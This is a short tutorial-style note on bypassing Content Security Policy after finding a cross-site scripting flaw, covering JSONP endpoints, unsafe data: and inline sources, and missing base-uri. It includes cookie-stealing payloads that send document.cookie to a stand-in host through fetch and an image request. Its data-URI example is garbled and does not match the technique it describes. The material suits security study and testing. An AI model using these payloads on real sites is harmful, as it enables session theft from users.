# CSP
If you've found an XSS vulnerability in a website, but can't run any unauthorized code, the CSP of the website may be blocking it. What you'll need to do is read the policy sent by the server and see if any flaws in it could be exploited to successfully inject and execute your payload.

A CSP policy can also be included within the page's HTML source code, using the <meta> tag, such as this:  
`<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none';">`

The HTTP `**Content-Security-Policy**` response header allows web site administrators to control resources the user agent is allowed to load for a given page. With a few exceptions, policies mostly involve specifying server origins and script endpoints.

**JSONP endpoints**

﻿Some sites may serve JSONP endpoints which call a JavaScript function in their response. If the callback function of these can be changed, they could be used to bypass the CSP and demonstrate a proof of concept, such as displaying an alert box or potentially even exfiltrating sensitive information from the client such as cookies or authentication tokens. A lot of popular websites serve JSONP endpoints, which can be usually used to bypass a security policy on a website that uses their services. The [JSONBee](https://github.com/zigoo0/JSONBee) repo lists a good amount of the currently available JSONP endpoints that can be used to bypass a website's security policy.

**Unsafe CSP configurations**

Some sites may allow loading of resources from unsafe sources, for example by allowing data: URIs or using the 'unsafe-inline' source. For example, if a website allows loading scripts from data: URIs, you can simply bypass their policy by moving your payload to the src attribute of the script, like so: `<script src="api/images/Y2AicB6m6C4j/javascript,alert(1)"></script>`

If the website you're exploiting allows AJAX requests (via `connect-src`) to anywhere, you can create a fetch request to your server like so:

``<script>fetch(`http://example.com/${document.cookie}`)</script>``

If you found an XSS vulnerability and bypassed CSP, but can't leak any information with it via XHR requests or fetch, the `connect-src` policy may be blocking your requests. This can be bypassed if the website you're exploiting doesn't have strict settings for directives such as image-src and media-src, which can be abused to leak information.

For example, if a website is blocking all of your XHR requests but allows images to be loaded from any location, you can abuse this with JavaScript to load a specially crafted URL that masquerades as an image, like so:``<script>(new Image()).src = `https://example.com/${encodeURIComponent(document.cookie)}`</script>``

Challenge Notes:
----------------

  
**base-uri** 

*   Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to 'none' or 'self'?
*   [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#consuming-tags](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#consuming-tags) 
*   [https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)